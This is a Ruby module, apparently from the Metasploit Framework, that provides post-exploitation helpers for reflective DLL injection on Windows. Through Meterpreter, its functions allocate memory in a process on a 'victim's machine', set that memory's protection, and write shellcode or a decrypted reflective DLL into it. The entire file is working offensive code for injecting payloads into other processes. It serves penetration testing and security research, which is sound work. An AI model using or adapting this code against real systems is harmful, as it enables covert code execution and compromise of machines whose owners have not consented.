# -*- coding: binary -*-


###
#
# This module exposes functionality which makes it easier to do
# Reflective DLL Injection into processes on a victim's machine.
#
###

module Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::ReflectiveDLLLoader

  PAGE_ALIGN = 1024

  def initialize(info = {})
    super(
      update_info(
        info,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_protect
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )
  end

  # Inject the given shellcode into a target process.
  #
  # @param process [Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Process]
  #   The process to inject the shellcode into.
  # @param shellcode [String] The shellcode to inject.
  #
  # @return [Integer] Address of the shellcode in the target process's
  #   memory.
  def inject_into_process(process, shellcode)
    shellcode_size = shellcode.length

    unless shellcode.length % PAGE_ALIGN == 0
      shellcode_size += PAGE_ALIGN - (shellcode.length % PAGE_ALIGN)
    end

    shellcode_mem = process.memory.allocate(shellcode_size)
    process.memory.protect(shellcode_mem)
    process.memory.write(shellcode_mem, shellcode)

    return shellcode_mem
  end

  # Inject a reflectively-injectable DLL into the given process
  # using reflective injection.
  #
  # @param process [Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Process]
  #   The process to inject the shellcode into.
  # @param dll_path [String] Path to the DLL that is to be loaded and injected.
  #
  # @return [Array] Tuple of allocated memory address and offset to the
  #   +ReflectiveLoader+ function.
  def inject_dll_into_process(process, dll_path, loader_name: 'ReflectiveLoader', loader_ordinal: EXPORT_REFLECTIVELOADER)
    dll, offset = load_rdi_dll(dll_path, loader_name: loader_name, loader_ordinal: loader_ordinal)
    dll_mem = inject_into_process(process, dll)

    return dll_mem, offset
  end

  # Inject a reflectively-injectable DLL into the given process
  # using reflective injection.
  #
  # @param process [Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Process]
  #   The process to inject the shellcode into.
  # @param dll_data [String] the DLL contents which is to be loaded and injected.
  #
  # @return [Array] Tuple of allocated memory address and offset to the
  #   +ReflectiveLoader+ function.
  def inject_dll_data_into_process(process, dll_data, loader_name: 'ReflectiveLoader', loader_ordinal: EXPORT_REFLECTIVELOADER)
    decrypted_dll_data = ::MetasploitPayloads::Crypto.decrypt(ciphertext: dll_data)
    offset = load_rdi_dll_from_data(decrypted_dll_data, loader_name: loader_name, loader_ordinal: loader_ordinal)
    dll_mem = inject_into_process(process, decrypted_dll_data)

    return dll_mem, offset
  end

end
